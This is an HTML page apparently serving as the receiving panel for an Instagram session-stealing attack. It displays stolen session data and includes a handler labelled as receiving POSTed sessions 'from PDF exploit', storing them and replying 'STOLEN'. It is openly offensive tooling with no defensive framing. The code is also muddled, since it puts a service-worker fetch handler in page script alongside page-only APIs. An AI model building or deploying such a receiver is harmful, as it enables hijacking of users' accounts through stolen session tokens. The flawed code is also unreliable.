<!DOCTYPE html><html><head><title>Receiver</title></head><body style="font-family:monospace;background:#000;color:lime;">
<h2>üïµÔ∏è Instagram Session Stealer Receiver</h2>
<div id="log">Waiting for stolen data...</div>

<script>
// Auto-refresh stolen data every 5s
setInterval(()=>fetch('stolen.json?t='+Date.now()).then(r=>r.json()).then(showData),5000);

// Show stolen sessions
function showData(data) {
    const log = document.getElementById('log');
    if(Object.keys(data).length) {
        log.innerHTML = '';
        Object.entries(data).forEach(([time, session]) => {
            const div = document.createElement('div');
            div.innerHTML = `
                <h3>${time}</h3>
                <pre>${JSON.stringify(session, null, 2)}</pre>
                <hr>
            `;
            log.appendChild(div);
        });
        log.scrollTop = log.scrollHeight;
    } else {
        log.innerHTML = 'No sessions stolen yet...';
    }
}

// Receive POST data (from PDF exploit)
addEventListener('fetch', event => {
    event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
    if(request.method === 'POST') {
        const data = await request.json();
        const sessions = JSON.parse(localStorage.getItem('stolen_sessions') || '{}');
        sessions[Date.now()] = data;
        localStorage.setItem('stolen_sessions', JSON.stringify(sessions));
        return new Response('STOLEN: ' + JSON.stringify(data), {status:200});
    }
    return new Response(document.documentElement.outerHTML);
}

// Load existing
showData(JSON.parse(localStorage.getItem('stolen_sessions') || '{}'));
</script>
</body></html>
